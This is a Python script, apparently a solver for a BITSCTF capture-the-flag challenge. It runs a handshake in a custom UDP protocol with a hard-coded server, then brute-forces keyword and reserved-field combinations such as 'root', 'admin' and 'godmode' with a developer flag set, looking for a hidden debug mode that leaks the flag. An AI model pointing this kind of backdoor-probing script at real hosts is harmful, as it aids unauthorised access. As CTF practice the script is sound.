import socket
from struct import pack, unpack
from enum import IntEnum

SERVER_IP = "20.244.40.210"
SERVER_PORT = 5002

class PacketType(IntEnum):
    DATA = 0x01
    SEEN = 0x02
    ERROR = 0x03

class Flags:
    DEV = 0b10000000
    SYN = 0b01000000
    ACK = 0b00100000
    ERROR = 0b00010000
    FIN = 0b00001000
    PSH = 0b00000100

def create_packet(version=1, packet_type=PacketType.DATA, flags=0, rsv=b'xxxx', payload=b''):
    payload_length = len(payload)
    return pack('!BBB4sB', version, packet_type, flags, rsv, payload_length) + payload

def send_packet(sock, packet):
    sock.sendto(packet, (SERVER_IP, SERVER_PORT))
    try:
        response, _ = sock.recvfrom(1024)
        return response
    except socket.timeout:
        return None

def unpack_packet(data):
    if len(data) < 8:
        return None
    version, packet_type, flags, rsv, payload_length = unpack('!BBB4sB', data[:8])
    payload = data[8:8+payload_length] if payload_length > 0 else b''
    return version, packet_type, flags, rsv, payload

def test_dev_unlock(sock):
    keywords = [b'dev', b'admin', b'debug', b'unlock', b'root', b'godmode', b'BITSCTF', b'bitsctf', b'FLAG', b'flag']
    rsv_values = [b'xxxx', b'dev!', b'root', b'flag', b'****', b'FLAG', b'BITSCTF', b'bitsctf']

    for keyword in keywords:
        for rsv in rsv_values:
            print(f"[+] Test avec Payload={keyword.decode(errors='ignore')} et RSV={rsv.decode(errors='ignore')}")
            packet = create_packet(packet_type=PacketType.DATA, flags=Flags.DEV, rsv=rsv, payload=keyword)
            response = send_packet(sock, packet)

            if response:
                version, p_type, flags, rsv, payload = unpack_packet(response)
                print(f"[+] Réponse : Type={p_type}, Flags={flags}, Payload={payload}")

                if payload:
                    print(f"[] FLAG POTENTIEL: {payload.decode(errors='ignore')}")
                    return

def exploit():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(2)
        print("[+] Connexion UDP prête")

        print("[+] Envoi du SYN...")
        syn_packet = create_packet(packet_type=PacketType.DATA, flags=Flags.SYN)
        response = send_packet(sock, syn_packet)
        
        if not response:
            print("[-] Aucun retour du serveur. Arrêt.")
            return

        version, p_type, flags, rsv, payload = unpack_packet(response)
        print(f"[+] Réponse : Type={p_type}, Flags={flags}, RSV={rsv}, Payload={payload}")

        if flags == (Flags.SYN | Flags.ACK):  # 96 = 0b01100000
            print("[+] Réception du SYN+ACK. Envoi de l'ACK...")

            # 2 Envoyer un ACK
            ack_packet = create_packet(packet_type=PacketType.DATA, flags=Flags.ACK)
            response = send_packet(sock, ack_packet)

            if response:
                version, p_type, flags, rsv, payload = unpack_packet(response)
                print(f"[+] Réponse après ACK : Type={p_type}, Flags={flags}, Payload={payload}")

        test_dev_unlock(sock)

if __name__ == "__main__":
    exploit()
